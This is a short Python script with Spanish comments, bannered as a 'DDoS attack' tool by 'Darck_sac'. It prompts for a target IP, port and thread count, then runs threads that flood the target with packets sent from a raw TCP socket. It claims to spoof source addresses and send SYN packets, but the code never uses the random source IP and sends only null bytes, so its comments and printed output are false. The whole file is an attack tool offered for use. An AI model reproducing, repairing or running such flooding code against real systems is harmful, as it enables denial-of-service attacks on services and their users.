import socket
import threading
import random
import os
from colorama import Fore, init

# Inicializa colorama para manejar los colores en la terminal
init()

def limpiar_pantalla():
    # Limpiar pantalla según el sistema operativo
    if os.name == 'nt':  # Para Windows
        os.system('cls')
    else:  # Para Unix (Linux, macOS)
        os.system('clear')

def mostrar_banner():
    banner = """
▒█▀▀▄ ▒█▀▀▄ █▀▀█ ▒█▀▀▀█ 　 █▀▀█ ▀▀█▀▀ █▀▀█ █▀▀ █░█ 
▒█░▒█ ▒█░▒█ █░░█ ░▀▀▀▄▄ 　 █▄▄█ ░░█░░ █▄▄█ █░░ █▀▄ 
▒█▄▄▀ ▒█▄▄▀ ▀▀▀▀ ▒█▄▄▄█ 　 ▀░░▀ ░░▀░░ ▀░░▀ ▀▀▀ ▀░▀
"""
    autor = "by Darck_sac"
    print(Fore.RED + banner + Fore.RESET)
    print(Fore.YELLOW + autor + Fore.RESET)

def atacar(target_ip, target_port):
    # Crea un socket RAW
    client = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)

    # Dirección de origen falsificada
    source_ip = f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"

    # Mensaje de SYN
    syn_msg = b"\x00" * 1024

    while True:
        try:
            # Enviar paquetes SYN al objetivo
            client.sendto(syn_msg, (target_ip, target_port))
            print(f"Enviando paquete a {target_ip}:{target_port} desde {source_ip}")
        except Exception as e:
            print(f"Error: {e}")
            break

if __name__ == "__main__":
    limpiar_pantalla()
    mostrar_banner()
    
    target_ip = input("Ingresa la IP del objetivo: ")
    target_port = int(input("Ingresa el puerto del objetivo: "))
    num_threads = int(input("Ingresa el número de hilos: "))

    for _ in range(num_threads):
        thread = threading.Thread(target=atacar, args=(target_ip, target_port))
        thread.start()
